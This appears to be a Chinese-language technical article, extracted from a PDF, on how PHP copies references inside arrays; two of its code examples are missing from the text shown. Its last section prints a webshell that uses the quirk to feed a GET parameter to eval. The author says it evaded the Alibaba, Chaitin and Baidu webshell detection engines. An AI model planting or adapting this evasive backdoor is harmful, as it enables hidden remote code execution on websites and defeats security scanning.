前言
继续分享一些 Webshell 的小tricks，在正文开始之前先留2个问题，可以先不看 pdf ，也不要把代码拿
去运行，用肉眼判断下面这2个 php 代码会输出什么，原理以及在 Webshell 中运用写在 PDF 里面了。
代码1：
代码2：
正文
这里应该也不用我揭晓答案了，拿去运行一下应该都一目了然了，上面提出的那2个代码均来自 php 
bug ，我相信绝大部分人如果没遇到过此问题的话很有可能会判断错误。
判断错误的人想法可能如下：
问题一：为什么代码一中变量 $a 只是将值拷贝给 $c ，并没有进行引用传值，但是 $c[0]="c" 还是改
变了 $a[0] 。
问题二：为什么代码二中 theFunction 参数不是引用传参，但是在函数内部还是改变了全局变量
$array 的值
其实这个问题最早在20多年前就被开发者提出了： https://bugs.php.net/bug.php?id=6417 ，并且在后面
几年一直有开发者在 php-bug 和手册的 note 中提及：
https://bugs.php.net/bug.php?id=6417
https://bugs.php.net/bug.php?id=7412
https://bugs.php.net/bug.php?id=15025
https://bugs.php.net/bug.php?id=20993
https://www.php.net/manual/zh/language.references.php
直到 php8 该“问题”还是依旧存在，没有修复的原因是因为 PHP 官方不认为是一个 bug ，并给出的解释
是：
由于 PHP 内部工作的特殊性，如果对数组的单个元素进行引用，然后复制数组，无论是通过赋值还是通
过函数调用中的值传递，都会将引用复制为数组的一部分。这意味着对任一数组中任何此类元素的更改
都将在另一个数组（和其他引用中）中重复，即使数组具有不同的作用域（例如，一个是函数内部的参
数，另一个是全局的）！在复制时没有引用的元素，以及在复制数组后分配给其他元素的引用，将正常
工作（即独立于其他数组）。
为了验证上面的说法，我们这里 xdebug_debug_zval 查看变量 a 和 c 的信息，可以看到 $a[0] 和
$c[0] 被标为了 is_ref ，也就是说它们是一个引用类型
为了更严谨一点，这里通过 gdb 对 PHP 进行调试，可以看到gdb中 $a[0] 和 $c[0] 也是被标为了
is_ref 并且都指向同一内存地址，这也就验证了为什么修改 c[0] 也会导致 a[0] 改变。
在Webshell中的运用
既然我们已经知道 PHP 在数组引用中有这么一个“tricks”，那么能不能在 Webshell 中进行运用呢，答案
是可以的。
下面这个是我在阿里云比赛中提交的一个绕过样本，后续也测试了长亭牧云和百度的引擎，均能绕过。
 "A");
$b=&$a[1]; 
$c=$a;
$c[$_GET["mem"]]=$_GET["cmd"];
eval($a[1]);
?>
如果 Webshell 引擎的开发没有对该“问题”进行适配的话，那么在后续的污点跟踪中会丢失相关的污
点，因为从 PHP 代码层面解析出来的抽象语法树上来看，变量 $c 只是对 $a 进行了一个值拷贝，所以
引擎自然而然地 $c 不会被标成污点。
思考
下面的代码又会输出什么呢？
https://bugs.php.net/bug.php?id=29992
参考
https://www.php.net/manual/zh/language.references.php
https://cloud.tencent.com/developer/article/1621153
https://bugs.php.net/bug.php?id=6417
https://bugs.php.net/bug.php?id=7412
https://bugs.php.net/bug.php?id=15025
https://bugs.php.net/bug.php?id=20993
https://bugs.php.net/bug.php?id=29992